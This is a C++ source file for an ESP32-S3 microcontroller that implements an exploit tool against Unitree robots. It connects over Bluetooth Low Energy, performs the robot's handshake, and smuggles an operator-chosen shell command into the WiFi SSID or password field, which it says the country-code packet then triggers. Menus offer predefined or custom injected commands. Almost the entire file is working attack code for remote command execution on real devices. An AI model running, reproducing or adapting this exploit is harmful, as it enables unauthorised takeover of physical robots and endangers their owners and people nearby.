/*
 * Unitree Robot Exploitation Functions
 * Optimized for Seeed XIAO ESP32-S3
 * Implements the BLE connection and command injection exploit
 */

// Notification callback for BLE
static void notifyCallback(BLERemoteCharacteristic* pBLERemoteCharacteristic,
                          uint8_t* pData, size_t length, bool isNotify) {
    std::vector<uint8_t> encryptedData(pData, pData + length);
    std::vector<uint8_t> decrypted = decryptData(encryptedData);
    
    // Debug: Log all notifications
    String hexData = "";
    for (size_t i = 0; i < min((size_t)16, decrypted.size()); i++) {
        hexData += String(decrypted[i], HEX) + " ";
    }
    styledPrint("[NOTIFY] Received " + String(decrypted.size()) + " bytes: " + hexData, true);
    
    if (decrypted.size() < 5 || decrypted[0] != 0x51) {
        styledPrint("[-] Corrupted notification packet - opcode: " + String(decrypted.size() > 0 ? decrypted[0] : 0, HEX), true);
        return;
    }
    
    uint8_t responseType = decrypted[2];
    styledPrint("[NOTIFY] Response type (instruction): " + String(responseType), true);
    
    // Handle serial number chunks (instruction 2)
    if (responseType == 0x02) {
        uint8_t chunkIndex = decrypted[3];
        uint8_t totalChunks = decrypted[4];
        
        std::vector<uint8_t> chunkData(decrypted.begin() + 5, decrypted.end() - 1);
        serialChunks[chunkIndex] = chunkData;
        
        styledPrint("Received serial chunk " + String(chunkIndex) + "/" + String(totalChunks), true);
        
        // Check if we have all chunks
        if (serialChunks.size() == totalChunks) {
            String serialNumber = "";
            for (uint8_t i = 1; i <= totalChunks; i++) {
                for (uint8_t byte : serialChunks[i]) {
                    if (byte != 0) serialNumber += (char)byte;
                }
            }
            styledPrint("Serial number: " + serialNumber);
            serialChunks.clear();
        }
        // Set notification flag for serial chunks too
        notificationReceived = true;
    } else {
        // Store general response
        styledPrint("[NOTIFY] Setting notification flag for instruction " + String(responseType), true);
        receivedNotification = decrypted;
        notificationReceived = true;
        styledPrint("[DEBUG] Notification flag set to TRUE", true);
    }
}

bool connectToDevice(const UnitreeDevice& device) {
    styledPrint("Connecting to " + device.name + " (" + device.address + ")");
    
    if (pClient) {
        if (pClient->isConnected()) {
            pClient->disconnect();
        }
        delete pClient;
        pClient = nullptr;
        delay(1000); // Give BLE stack time to clean up
    }
    
    pClient = BLEDevice::createClient();
    BLEAddress address(device.address.c_str());
    
    if (!pClient->connect(address)) {
        styledPrint("[-] Failed to connect to device");
        return false;
    }
    
    deviceConnected = true;
    styledPrint("Connected successfully", true);
    
    // Get the service
    BLERemoteService* pRemoteService = pClient->getService(BLEUUID(UNITREE_SERVICE_UUID));
    if (!pRemoteService) {
        styledPrint("[-] Failed to find Unitree service");
        pClient->disconnect();
        return false;
    }
    
    // Get characteristics with error handling
    try {
        pWriteChar = pRemoteService->getCharacteristic(BLEUUID(CUSTOM_CHAR_UUID_2));
        pNotifyChar = pRemoteService->getCharacteristic(BLEUUID(CUSTOM_CHAR_UUID));
        
        if (!pWriteChar || !pNotifyChar) {
            styledPrint("[-] Failed to find required characteristics, trying backup method");
            // Try to continue anyway - some devices work even with characteristic errors
        }
        
        // Register for notifications with error handling (matching Python fallback)
        if (pNotifyChar && pNotifyChar->canNotify()) {
            pNotifyChar->registerForNotify(notifyCallback);
            styledPrint("Notification handler registered", true);
        } else {
            styledPrint("[-] Primary notification hook failed, trying backup method", true);
            // Try to continue anyway - Python uses handle 13 as backup
            // ESP32 BLE library handles this differently, but we'll try to continue
        }
    } catch (...) {
        styledPrint("[-] Characteristic discovery failed, but continuing", true);
    }
    
    return true;
}

bool waitForNotification(uint32_t timeoutMs = 5000) {
    // Don't reset the flag if notification already received
    if (notificationReceived) {
        styledPrint("[DEBUG] Notification already received before wait", true);
        return true;
    }
    
    unsigned long startTime = millis();
    styledPrint("[DEBUG] Waiting for notification, timeout=" + String(timeoutMs) + "ms", true);
    
    while (!notificationReceived && (millis() - startTime) < timeoutMs) {
        yield(); // Non-blocking delay - allows BLE processing
        delay(1); // Minimal delay
    }
    
    styledPrint("[DEBUG] Wait complete: received=" + String(notificationReceived) + ", elapsed=" + String(millis() - startTime) + "ms", true);
    return notificationReceived;
}

bool sendHandshake() {
    if (!pWriteChar) {
        styledPrint("[-] Write characteristic not available for handshake");
        return false;
    }
    
    // Reset notification flag before starting handshake
    notificationReceived = false;
    receivedNotification.clear();
    
    // Simple handshake: just send "unitree" string as instruction 0x01
    // This matches the original Python implementation exactly
    std::vector<uint8_t> handshakeData(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end());
    std::vector<uint8_t> packet = createPacket(0x01, handshakeData);
    
    styledPrint("[BLE] Writing handshake packet (bytes=" + String(packet.size()) + ") using 0x52 GATT write", true);
    pWriteChar->writeValue(packet.data(), packet.size(), false); // false = force 0x52 GATT write for vulnerability
    
    // Small delay to ensure packet is sent before waiting for response
    delay(100);
    
    if (waitForNotification(10000)) { // 10 second timeout
        // Accept instruction 0 or 1 as valid handshake response
        if (genericResponseValidator(receivedNotification, 0x01) || 
            genericResponseValidator(receivedNotification, 0x00)) {
            styledPrint("[BLE] Handshake successful!");
            return true;
        }
        styledPrint("[-] Handshake response validation failed");
    } else {
        styledPrint("[-] Handshake timeout - no response from device");
    }
    
    return false;
}

bool getSerialNumber() {
    styledPrint("Getting serial number...", true);
    
    std::vector<uint8_t> packet = createPacket(2, {0});
    pWriteChar->writeValue(packet.data(), packet.size(), false); // Keep original serial logic
    
    // Wait a bit longer for serial number chunks
    delay(1000);
    
    return true; // Serial number is handled in notification callback
}

bool initializeWifi(uint8_t mode = 2) {
    styledPrint("Initializing WiFi mode " + String(mode == 1 ? "AP" : mode == 2 ? "STA" : String(mode)), true);
    
    std::vector<uint8_t> packet = createPacket(3, {mode});
    pWriteChar->writeValue(packet.data(), packet.size(), false); // false = force 0x52 GATT write for vulnerability
    
    if (!waitForNotification(5000)) { // 5 second timeout (matches Python)
        styledPrint("[-] WiFi initialization timeout");
        return false; // Fail if no response (matches Python behavior)
    }
    
    if (!genericResponseValidator(receivedNotification, 3)) {
        styledPrint("[-] WiFi initialization response invalid");
        return false; // Fail if invalid response (matches Python behavior)
    }
    
    styledPrint("[WIFI] WiFi initialization successful", true);
    return true;
}

bool sendChunkedData(uint8_t instruction, const String& data) {
    if (!pWriteChar) {
        styledPrint("[-] Write characteristic not available");
        return false;
    }
    
    // Reset notification flags before starting chunked transmission
    notificationReceived = false;
    receivedNotification.clear();
    
    styledPrint("[BLE] Preparing chunked send: instr=" + String(instruction) + ", bytes=" + String(data.length()));
    std::vector<uint8_t> dataBytes(data.begin(), data.end());
    uint8_t totalChunks = (dataBytes.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    
    styledPrint("[BLE] Sending " + String(totalChunks) + " chunks for instruction " + String(instruction), true);
    
    for (uint8_t i = 0; i < totalChunks; i++) {
        size_t start = i * CHUNK_SIZE;
        size_t end = min((size_t)(start + CHUNK_SIZE), dataBytes.size());
        
        std::vector<uint8_t> chunk(dataBytes.begin() + start, dataBytes.begin() + end);
        std::vector<uint8_t> packetData = {(uint8_t)(i + 1), totalChunks};
        packetData.insert(packetData.end(), chunk.begin(), chunk.end());
        
        std::vector<uint8_t> packet = createPacket(instruction, packetData);
        styledPrint("[BLE] Chunk " + String(i+1) + "/" + String(totalChunks) + ", size=" + String(chunk.size()) + ", encrypted_size=" + String(packet.size()));
        
        // Log the actual data being sent for debugging
        String chunkContent = "";
        for (size_t j = 0; j < min((size_t)10, chunk.size()); j++) {
            chunkContent += String(chunk[j], HEX) + " ";
        }
        if (chunk.size() > 10) chunkContent += "...";
        styledPrint("[BLE] Chunk data: " + chunkContent, true);
        
        // Debug: Log the actual packet being sent
        String packetHex = "";
        for (size_t j = 0; j < min((size_t)16, packet.size()); j++) {
            packetHex += String(packet[j], HEX) + " ";
        }
        styledPrint("[BLE] Sending packet (encrypted): " + packetHex, true);
        
        // CRITICAL: Use writeValue(data, size, false) to force 0x52 GATT write (not long write)
        // Long writes don't enter the vulnerable function - only 0x52 commands work
        styledPrint("[BLE] Writing chunk packet of size " + String(packet.size()) + " bytes (0x52 GATT write)", true);
        pWriteChar->writeValue(packet.data(), packet.size(), false); // false = force 0x52 GATT write
        
        // Match original Python: NO delay for SSID (instruction 4), 100ms delay for password (instruction 5)
        if (instruction == 5) {
            delay(100); // 100ms sleep for password chunks ONLY (matches Python asyncio.sleep(0.1))
        }
        
        // EXPERIMENTAL: Don't wait for acknowledgment - just send chunks and continue
        // The Pi receives all chunks successfully but has issues sending responses
        if (i + 1 == totalChunks) {
            styledPrint("[BLE] All chunks sent successfully - continuing without waiting for ack", true);
            // Small delay to ensure last chunk is processed
            delay(500);
        }
    }
    
    return true;
}

bool setSSID(const String& ssid) {
    styledPrint("[WIFI] Setting SSID (length=" + String(ssid.length()) + ")", true);
    return sendChunkedData(4, ssid);
}

bool setPassword(const String& password) {
    styledPrint("[WIFI] Setting password (length=" + String(password.length()) + ")", true);
    return sendChunkedData(5, password);
}

bool setCountryCode() {
    styledPrint("[WIFI] Setting country code: " + COUNTRY_CODE, true);
    
    // Reset notification flag before sending country code
    notificationReceived = false;
    receivedNotification.clear();
    
    std::vector<uint8_t> countryBytes(COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    countryBytes.push_back(0); // Null terminator
    
    // Use UniPwn format: [1] + country_bytes
    std::vector<uint8_t> dataBytes = {1};
    dataBytes.insert(dataBytes.end(), countryBytes.begin(), countryBytes.end());
    
    std::vector<uint8_t> packet = createPacket(6, dataBytes);
    pWriteChar->writeValue(packet.data(), packet.size(), false); // 0x52 GATT write for vulnerability
    
    // Don't wait for response - just like chunked data, send and continue
    styledPrint("[WIFI] Country code sent successfully - exploit should be triggered!", true);
    delay(500); // Small delay to ensure packet is processed
    
    styledPrint("Exploit triggered! Command should execute now.");
    return true;
}


bool exploitSequence(const String& ssid, const String& password) {
    styledPrint("[EXPLOIT] Starting exploitation sequence");
    
    // Step 1: Handshake
    if (!sendHandshake()) {
        return false;
    }
    
    // Step 2: Get serial number (verification)
    getSerialNumber();
    
    // Step 3: Initialize WiFi (per UniPwn research - required step)
    styledPrint("[EXPLOIT] WiFi initialization (instruction 3)");
    initializeWifi(2); // STA mode - continue regardless of response
    
    // Step 4: Set SSID - COMMAND INJECTION HAPPENS HERE (instruction 4)
    if (!setSSID(ssid)) {
        styledPrint("[-] SSID stage failed");
        return false;
    }
    
    // Step 5: Set password (normal password)
    if (!setPassword(password)) {
        styledPrint("[-] Password stage failed");
        return false;
    }
    
    // Step 6: Set country code - THIS IS THE TRIGGER that executes the injected command!
    if (!setCountryCode()) {
        styledPrint("[-] Country code stage failed");
        return false;
    }
    
    styledPrint("Exploitation complete! Command should have executed via country code trigger.");
    return true;
}

void selectAndExploitDevice() {
    // First show available devices
    std::vector<UnitreeDevice> allDevices = discoveredDevices;
    allDevices.insert(allDevices.end(), recentDevices.begin(), recentDevices.end());
    
    if (allDevices.empty()) {
        styledPrint("[-] No devices available. Run a scan first.");
        return;
    }
    
    // Remove duplicates
    for (auto it = allDevices.begin(); it != allDevices.end(); ++it) {
        for (auto it2 = it + 1; it2 != allDevices.end();) {
            if (it->address == it2->address) {
                it2 = allDevices.erase(it2);
            } else {
                ++it2;
            }
        }
    }
    
    Serial.println("\nAvailable devices:");
    for (size_t i = 0; i < allDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + allDevices[i].name + 
                      " (" + allDevices[i].address + ")");
    }
    
    Serial.print("\n\033[1;32m[//] Select device (1-" + String(allDevices.size()) + "): \033[0m");
    
    // Wait for user input
    while (!Serial.available()) {
        delay(100);
    }
    
    int deviceChoice = Serial.parseInt();
    if (deviceChoice < 1 || deviceChoice > (int)allDevices.size()) {
        styledPrint("[-] Invalid device selection");
        return;
    }
    
    UnitreeDevice selectedDevice = allDevices[deviceChoice - 1];
    
    // Connect to device
    if (!connectToDevice(selectedDevice)) {
        return;
    }
    
    // Add to recent devices
    addRecentDevice(selectedDevice);
    
    // Show exploitation options
    Serial.println("\nExploitation options:");
    Serial.println("1. Command injection only (via SSID)");
    Serial.println("2. Command injection + WiFi config (via password)");
    Serial.println("3. WiFi configuration only (no injection)");
    
    Serial.print("\n\033[1;32m[//] Select option (1-3): \033[0m");
    
    while (!Serial.available()) {
        delay(100);
    }
    
    int exploitChoice = Serial.parseInt();
    
    String ssid = "";
    String password = "";
    String command = "";
    
    if (exploitChoice == 3) {
        // WiFi only
        Serial.print("\n\033[1;32m[//] Enter WiFi SSID: \033[0m");
        while (!Serial.available()) delay(100);
        ssid = Serial.readString();
        ssid.trim();
        
        Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
        while (!Serial.available()) delay(100);
        password = Serial.readString();
        password.trim();
    } else {
        // Show command options
        Serial.println("\nAvailable commands:");
        for (size_t i = 0; i < predefinedCmds.size(); i++) {
            Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                          " - " + predefinedCmds[i].description);
        }
        Serial.println("  " + String(predefinedCmds.size() + 1) + ". Custom command");
        
        Serial.print("\n\033[1;32m[//] Select command (1-" + String(predefinedCmds.size() + 1) + "): \033[0m");
        
        while (!Serial.available()) delay(100);
        int cmdChoice = Serial.parseInt();
        
        if (cmdChoice >= 1 && cmdChoice <= (int)predefinedCmds.size()) {
            command = predefinedCmds[cmdChoice - 1].cmd;
            styledPrint("Selected: " + predefinedCmds[cmdChoice - 1].name);
        } else if (cmdChoice == (int)predefinedCmds.size() + 1) {
            Serial.print("\033[1;32m[//] Enter custom command: \033[0m");
            while (!Serial.available()) delay(100);
            command = Serial.readString();
            command.trim();
        } else {
            styledPrint("[-] Invalid command selection");
            if (pClient) pClient->disconnect();
            return;
        }
        
        if (exploitChoice == 1) {
            // Command via SSID
            ssid = buildPwn(command);
            password = "";
        } else if (exploitChoice == 2) {
            // Command via password + WiFi config
            Serial.print("\033[1;32m[//] Enter WiFi SSID: \033[0m");
            while (!Serial.available()) delay(100);
            ssid = Serial.readString();
            ssid.trim();
            
            Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
            while (!Serial.available()) delay(100);
            password = Serial.readString();
            password.trim();
            password += buildPwn(command);
        }
    }
    
    // Execute exploit
    styledPrint("Executing exploit...");
    bool success = exploitSequence(ssid, password);
    
    if (success) {
        styledPrint("Exploit completed successfully!");
    } else {
        styledPrint("[-] Exploit failed");
    }
    
    // Disconnect
    if (pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
}

void exploitDevice(const String& ssid, const String& password) {
    styledPrint("[EXPLOIT] Starting WiFi configuration exploit...");
    styledPrint("[EXPLOIT] Target SSID length=" + String(ssid.length()));
    
    if (!deviceConnected || !pWriteChar || !pNotifyChar) {
        styledPrint("[-] Device not properly connected");
        return;
    }
    
    // Send handshake (createPacket already encrypts)
    std::vector<uint8_t> handshake = createPacket(0x01, 
        std::vector<uint8_t>(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end()));
    
    pWriteChar->writeValue(handshake.data(), handshake.size(), true); // Use response=true like Python
    if (!waitForNotification()) {
        styledPrint("[-] Handshake failed");
        return;
    }
    
    styledPrint("[BLE] Handshake successful");
    
    // Build and send WiFi configuration (combined packet path)
    std::vector<uint8_t> wifiData;
    
    // Add SSID
    wifiData.insert(wifiData.end(), ssid.begin(), ssid.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add password
    wifiData.insert(wifiData.end(), password.begin(), password.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add country code
    wifiData.insert(wifiData.end(), COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    wifiData.push_back(0x00);  // Null terminator
    
    std::vector<uint8_t> wifiPacket = createPacket(0x04, wifiData);
    
    styledPrint("[BLE] Writing WiFi packet (bytes=" + String(wifiPacket.size()) + ")", true);
    pWriteChar->writeValue(wifiPacket.data(), wifiPacket.size(), true); // Use response=true like Python
    if (!waitForNotification()) {
        styledPrint("[-] WiFi configuration timeout");
        return;
    }
    
    styledPrint("[WIFI] Configuration acknowledged by target");
    styledPrint("[EXPLOIT] Payload delivered");
}

// Handshake-only helper for web AutoPwn step verification
bool performHandshake(const UnitreeDevice& device) {
    styledPrint("[BLE] Handshake verification start");
    
    // Stop continuous scanning to prevent BLE interference during handshake
    if (continuousScanning) {
        styledPrint("[BLE] Stopping scan to prevent interference...");
        stopContinuousScanning();
        delay(500); // Give BLE stack time to clean up
    }
    
    if (!connectToDevice(device)) {
        styledPrint("[-] Unable to connect for handshake");
        return false;
    }
    bool ok = sendHandshake();
    
    // Only disconnect if handshake failed - keep connection alive for successful handshakes
    if (!ok && pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
    
    styledPrint(ok ? "[BLE] Handshake verification OK - connection maintained" : "[-] Handshake verification FAILED");
    return ok;
}
